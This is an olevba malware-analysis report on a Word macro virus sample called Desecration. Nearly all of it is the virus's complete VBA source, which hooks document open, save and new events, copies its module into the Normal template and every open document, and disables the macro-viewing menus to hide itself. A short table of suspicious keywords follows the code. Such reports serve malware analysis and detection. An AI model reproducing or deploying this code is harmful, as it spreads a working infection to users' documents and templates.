olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Desecration
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Desecration - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Desecration.bas 
in file: Virus.MSWord.Desecration - OLE stream: 'Macros/VBA/Desecration'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Desecration By RUiNER /Sign Of Scream
Dim xHost As String
Dim xVictim As String

Public Sub AutoOpen()
On Error Resume Next
If Application.Documents.Count = 0 Then
xHost = "Normal"
Else
xHost = Application.ActiveDocument.Name
End If
xVictim = xHost
Desecration
End Sub

Public Sub FileSave()
On Error Resume Next
xHost = Application.ActiveDocument.Name
xVictim = xHost
Desecration
ActiveDocument.Save
End Sub

Public Sub FileNew()
On Error Resume Next
If Application.Documents.Count = 0 Then
xHost = "Normal"
Else
xHost = Application.ActiveDocument.Name
End If
Dialogs(wdDialogFileNew).Show
xVictim = Application.ActiveDocument.Name
Desecration
End Sub

Public Sub FileOpen()
On Error Resume Next
If Application.Documents.Count = 0 Then
xHost = "Normal"
Else
xHost = Application.ActiveDocument.Name
End If
Dialogs(wdDialogFileOpen).Show
xVictim = Application.ActiveDocument.Name
Desecration
End Sub

Private Sub Desecration()
Dim xFlag As Integer
On Error Resume Next

xFlag = 0
For z = 1 To Normal.ThisDocument.VBProject.VBComponents.Count
If Normal.ThisDocument.VBProject.VBComponents.Item(z).Name = "Desecration" Then xFlag = xFlag + 1
Next z

If xFlag = 0 Then
 If xHost = "Normal" Then
  Normal.ThisDocument.VBProject.VBComponents("Desecration").Export "C:\MSDOS.___"
 Else
  Application.Documents(xHost).VBProject.VBComponents("Desecration").Export "C:\MSDOS.___"
 End If
 Normal.ThisDocument.VBProject.VBComponents.Import "C:\MSDOS.___"
Else
 Normal.ThisDocument.VBProject.VBComponents("Desecration").Export "C:\MSDOS.___"
End If

For z = 1 To Application.Documents.Count
 If Right$(Application.Documents(z).VBProject.Name, 1) <> "x" Then
  Application.Documents(z).VBProject.VBComponents.Import "C:\MSDOS.___"
  Application.Documents(z).VBProject.Name = Application.Documents(z).VBProject.Name & "x"
 End If
Next z

Application.Documents(xVictim).Activate
Kill "C:\MSDOS.___"
End Sub

Sub ToolsMacro()
End Sub

Sub ViewVBCode()
End Sub

Sub FileTemplates()
End Sub

Sub ToolsCustomize()
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

